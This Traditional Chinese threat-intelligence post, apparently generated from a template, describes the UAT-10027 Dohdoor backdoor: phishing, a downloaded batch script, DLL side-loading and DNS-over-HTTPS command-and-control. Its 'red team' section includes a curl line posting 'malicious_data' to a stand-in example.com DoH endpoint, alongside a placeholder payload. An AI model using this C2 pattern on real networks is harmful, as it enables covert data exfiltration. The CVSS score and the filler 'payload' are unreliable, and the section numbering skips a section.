# 🚨 解析 UAT-10027 攻擊活動：利用 DNS-over-HTTPS 進行 C2 通信的 Dohdoor 後門

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DNS-over-HTTPS (DoH), DLL side-loading, Cobalt Strike Beacon

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Dohdoor 後門利用 DNS-over-HTTPS (DoH) 技術進行 C2 通信，繞過傳統的 DNS 基於的偵測系統和網路流量分析工具。
* **攻擊流程圖解**:
  1. 初步入侵：使用社交工程釣魚技術，執行 PowerShell 腳本。
  2. 下載和執行 Windows batch 腳本：從遠程伺服器下載和執行 batch 腳本，進一步下載和執行惡意的 Windows 動態連結庫 (DLL)。
  3. DLL side-loading：使用合法的 Windows 可執行檔（例如 "Fondue.exe"）啟動 Dohdoor 後門。
  4. C2 通信：使用 DoH 技術進行 C2 通信，繞過傳統的偵測系統。
* **受影響元件**: Windows 作業系統，尤其是教育和醫療行業的機構。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有初步入侵的權限和網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload 結構
      payload = {
        "type": "dns",
        "domain": "example.com",
        "data": " malicious_data "
      }
    
    ```
  *範例指令*: 使用 `curl` 命令發送 DoH 請求：

```

bash
  curl -X POST \
  https://example.com/doh \
  -H 'Content-Type: application/dns-message' \
  -d ' malicious_data '

```
* **繞過技術**: 使用 DoH 技術繞過傳統的 DNS 基於的偵測系統和網路流量分析工具。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DNS-over-HTTPS (DoH)**: 一種使用 HTTPS 通信協定進行 DNS 查詢的技術，繞過傳統的 DNS 基於的偵測系統和網路流量分析工具。
* **DLL side-loading**: 一種攻擊技術，使用合法的 Windows 可執行檔啟動惡意的 DLL。
* **Cobalt Strike Beacon**: 一種遠程存取工具 (RAT)，用於進行 C2 通信和資料收集。
